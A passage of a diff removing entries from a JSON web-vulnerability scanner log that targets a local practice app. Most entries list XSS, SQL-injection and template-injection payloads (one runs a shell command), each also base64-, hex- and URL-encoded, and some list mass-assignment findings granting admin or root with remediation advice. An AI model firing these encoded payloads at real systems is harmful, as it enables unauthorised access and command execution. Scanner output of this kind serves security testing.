-          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
-          "UNION SELECT admin_creds, password FROM users--",
-          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
-          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
-          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
-          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
-          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
-          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
-          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
-        ]
-      }
-    }
-  },
-  {
-    "timestamp": 1781451943.3016758,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "56675efc-b107-4830-85a0-751e4ef67a29",
-      "status": "SUCCESS",
-      "target_url": "http://localhost:8080/vulnerabilities/exec/",
-      "target_headers": {
-        "Cookie": "PHPSESSID=ms4c85pq6b5jgocvs69i57cl85; security=low",
-        "Content-Type": "application/x-www-form-urlencoded"
-      },
-      "data": {
-        "generated_payloads": [
-          "<script>alert('XSS_BY_SIGMA')</script>",
-          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
-          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
-          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
-          "UNION SELECT admin_creds, password FROM users--",
-          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
-          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
-          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
-          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
-          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
-          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
-          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
-        ]
-      }
-    }
-  },
-  {
-    "timestamp": 1781451953.4082258,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "56675efc-b107-4830-85a0-751e4ef67a29",
-      "status": "SUCCESS",
-      "target_url": "http://localhost:8080/vulnerabilities/exec/",
-      "target_headers": {
-        "Cookie": "PHPSESSID=ms4c85pq6b5jgocvs69i57cl85; security=low",
-        "Content-Type": "application/x-www-form-urlencoded"
-      },
-      "data": {
-        "generated_payloads": [
-          "<script>alert('XSS_BY_SIGMA')</script>",
-          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
-          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
-          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
-          "UNION SELECT admin_creds, password FROM users--",
-          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
-          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
-          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
-          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
-          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
-          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
-          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
-        ]
-      }
-    }
-  },
-  {
-    "timestamp": 1781451963.5121806,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "85b49a62-d6d8-4d63-ac81-40b53d02c042",
-      "status": "SUCCESS",
-      "target_url": "http://localhost:8080/vulnerabilities/fi/?page=include.php",
-      "target_headers": {
-        "Cookie": "PHPSESSID=ms4c85pq6b5jgocvs69i57cl85; security=low"
-      },
-      "data": {
-        "generated_payloads": [
-          "<script>alert('XSS_BY_SIGMA')</script>",
-          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
-          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
-          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
-          "UNION SELECT admin_creds, password FROM users--",
-          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
-          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
-          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
-          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
-          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
-          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
-          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
-        ]
-      }
-    }
-  },
-  {
-    "timestamp": 1781451973.6009665,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "85b49a62-d6d8-4d63-ac81-40b53d02c042",
-      "status": "SUCCESS",
-      "target_url": "http://localhost:8080/vulnerabilities/fi/?page=include.php",
-      "target_headers": {
-        "Cookie": "PHPSESSID=ms4c85pq6b5jgocvs69i57cl85; security=low"
-      },
-      "data": {
-        "generated_payloads": [
-          "<script>alert('XSS_BY_SIGMA')</script>",
-          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
-          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
-          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
-          "UNION SELECT admin_creds, password FROM users--",
-          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
-          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
-          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
-          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
-          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
-          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
-          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
-        ]
-      }
-    }
-  },
-  {
-    "timestamp": 1781451984.3656552,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "09c47a6f-bb5a-40a4-a2e7-1a611caaa882",
-      "status": "SUCCESS",
-      "target_url": "http://localhost:8080/vulnerabilities/brute/?username=admin&password=test&Login=Login",
-      "target_headers": {
-        "Cookie": "PHPSESSID=ms4c85pq6b5jgocvs69i57cl85; security=low"
-      },
-      "data": {
-        "generated_payloads": [
-          "<script>alert('XSS_BY_SIGMA')</script>",
-          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
-          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
-          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
-          "UNION SELECT admin_creds, password FROM users--",
-          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
-          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
-          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
-          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
-          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
-          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
-          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
-        ]
-      }
-    }
-  },
-  {
-    "timestamp": 1781452004.4078631,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "09c47a6f-bb5a-40a4-a2e7-1a611caaa882",
-      "status": "SUCCESS",
-      "target_url": "http://localhost:8080/vulnerabilities/brute/?username=admin&password=test&Login=Login",
-      "target_headers": {
-        "Cookie": "PHPSESSID=ms4c85pq6b5jgocvs69i57cl85; security=low"
-      },
-      "data": {
-        "generated_payloads": [
-          "<script>alert('XSS_BY_SIGMA')</script>",
-          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
-          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
-          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
-          "UNION SELECT admin_creds, password FROM users--",
-          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
-          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
-          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
-          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
-          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
-          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
-          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
-        ]
-      }
-    }
-  },
-  {
-    "timestamp": 1781452014.938314,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "7013ec1a-9024-4c40-9f5a-e01363734fca",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781452025.4418833,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "7013ec1a-9024-4c40-9f5a-e01363734fca",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781452035.9910815,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "bcdd2537-4e19-40c6-9e01-a3e3ce412b16",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781452046.4740736,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "bcdd2537-4e19-40c6-9e01-a3e3ce412b16",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781452047.0060236,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "ff127e40-2338-4562-855a-c4c891773dac",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781452047.538392,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "ff127e40-2338-4562-855a-c4c891773dac",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781452048.0322087,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "b5a59b19-0be3-4d0b-80f8-d00e2113686d",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781452048.7156909,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "b5a59b19-0be3-4d0b-80f8-d00e2113686d",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781452049.2608345,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "2d7240ed-3d65-485f-b5ea-31b08cf3acb9",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781452049.7713728,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "2d7240ed-3d65-485f-b5ea-31b08cf3acb9",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781452050.1015997,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "033c247a-3d62-4611-bf31-e01e8b7cead7",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781452050.554989,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "033c247a-3d62-4611-bf31-e01e8b7cead7",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781452051.234884,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "075e1c10-3649-412d-a19d-771b981787a2",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781452051.7150612,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "075e1c10-3649-412d-a19d-771b981787a2",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781452238.710179,
-    "scan_id": "df77320b-b532-4590-ad23-db3ea6012309",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "0642d1e6-4146-482a-9162-059590ed8842",
-      "status": "SUCCESS",
-      "module_id": "alpha_v6_recon"
-    }
-  },
-  {
-    "timestamp": 1781452258.7267075,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "d557b3d8-d8e0-41c6-a054-3b965eedf129",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452259.315406,
-    "scan_id": "df77320b-b532-4590-ad23-db3ea6012309",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "421b631f-301a-4d20-bfc8-e029e42c91fd",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781452273.6799283,
-    "scan_id": "df77320b-b532-4590-ad23-db3ea6012309",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "e8074ba9-c1a4-4cc1-9763-cdb200913dee",
-      "status": "SUCCESS",
-      "target_url": "http://localhost:8080",
-      "target_headers": {},
-      "data": {
-        "generated_payloads": [
-          "<script>alert('XSS_BY_SIGMA')</script>",
-          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
-          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
-          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
-          "UNION SELECT admin_creds, password FROM users--",
-          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
-          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
-          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
-          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
-          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
-          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
-          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
-        ]
-      }
-    }
-  },
-  {
-    "timestamp": 1781452284.1597922,
-    "scan_id": "df77320b-b532-4590-ad23-db3ea6012309",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "ee242176-aa3a-473c-8f51-d884311a94cb",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781452298.5161674,
-    "scan_id": "df77320b-b532-4590-ad23-db3ea6012309",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "b342fcf1-454a-42e7-98c0-af2d46f6690f",
-      "status": "SUCCESS",
-      "target_url": "http://localhost:8080",
-      "target_headers": {},
-      "data": {
-        "generated_payloads": [
-          "<script>alert('XSS_BY_SIGMA')</script>",
-          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
-          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
-          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
-          "UNION SELECT admin_creds, password FROM users--",
-          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
-          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
-          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
-          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
-          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
-          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
-          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
-        ]
-      }
-    }
-  },
-  {
-    "timestamp": 1781452298.547262,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "d3d1a9d6-0ec2-4230-9da9-6dfaef180582",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452298.5722141,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "1a8978e8-a151-4ecf-b3c6-17a93596fab7",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452298.602206,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "36156fc1-f34e-4e10-af86-10413e336c75",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452403.2500725,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "da55d985-4a2d-4cfb-991a-1a5b0740481b",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452403.2797744,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "ff982570-b460-4173-8006-e8f15d8315d5",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452403.3122263,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "cd4ab5ea-a7a2-49a9-9a3d-2cbbafc73504",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452403.3389945,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "52b7bc2c-f64d-40dd-9eff-fbe48c67c030",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452403.3772154,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "57b03afe-60fd-47d7-9844-5c4c29aacb1d",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452403.4072442,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "b3ac3f12-602e-46a3-a110-46a4efbb6c75",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452403.4408796,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "08f48188-a7b6-4386-b470-b63f57b67f37",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452414.559284,
-    "scan_id": "df77320b-b532-4590-ad23-db3ea6012309",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "575bdcdb-372a-4f3d-8f72-d3ba1849bae9",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781452425.6528091,
-    "scan_id": "df77320b-b532-4590-ad23-db3ea6012309",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "5590a8ff-ad80-469b-8619-1701ceadde8f",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781452436.1844003,
-    "scan_id": "df77320b-b532-4590-ad23-db3ea6012309",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "8ee121be-0053-4c6e-9f60-0919b565ba92",
-      "status": "VULN_FOUND",
-      "vulnerabilities": [
-        {
-          "name": "Mass Assignment (POST)",
-          "severity": "HIGH",
-          "description": "Accepted {'is_admin': True} via POST",
-          "evidence": "Payload {'is_admin': True}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (PATCH)",
-          "severity": "CRITICAL",
-          "description": "Accepted {'is_admin': True} via PATCH",
-          "evidence": "Payload {'is_admin': True}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (POST)",
-          "severity": "HIGH",
-          "description": "Accepted {'role': 'admin'} via POST",
-          "evidence": "Payload {'role': 'admin'}. logic signals=3 [positive_marker, no_denial_marker, payload_reflected]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (PATCH)",
-          "severity": "CRITICAL",
-          "description": "Accepted {'role': 'admin'} via PATCH",
-          "evidence": "Payload {'role': 'admin'}. logic signals=3 [positive_marker, no_denial_marker, payload_reflected]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (POST)",
-          "severity": "HIGH",
-          "description": "Accepted {'groups': ['root', 'admin']} via POST",
-          "evidence": "Payload {'groups': ['root', 'admin']}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (POST)",
-          "severity": "HIGH",
-          "description": "Accepted {'permissions': 'ALL'} via POST",
-          "evidence": "Payload {'permissions': 'ALL'}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (PATCH)",
-          "severity": "CRITICAL",
-          "description": "Accepted {'permissions': 'ALL'} via PATCH",
-          "evidence": "Payload {'permissions': 'ALL'}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (POST)",
-          "severity": "HIGH",
-          "description": "Accepted {'groups': ['root']} via POST",
-          "evidence": "Payload {'groups': ['root']}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (PATCH)",
-          "severity": "CRITICAL",
-          "description": "Accepted {'groups': ['root']} via PATCH",
-          "evidence": "Payload {'groups': ['root']}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        }
-      ]
-    }
-  },
-  {
-    "timestamp": 1781452446.6834025,
-    "scan_id": "df77320b-b532-4590-ad23-db3ea6012309",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "b31c7a33-057f-4ef3-8f27-8d6b15647099",
-      "status": "VULN_FOUND",
-      "vulnerabilities": [
-        {
-          "name": "Mass Assignment (POST)",
-          "severity": "HIGH",
-          "description": "Accepted {'is_admin': True} via POST",
-          "evidence": "Payload {'is_admin': True}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (PATCH)",
-          "severity": "CRITICAL",
-          "description": "Accepted {'is_admin': True} via PATCH",
-          "evidence": "Payload {'is_admin': True}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (POST)",
-          "severity": "HIGH",
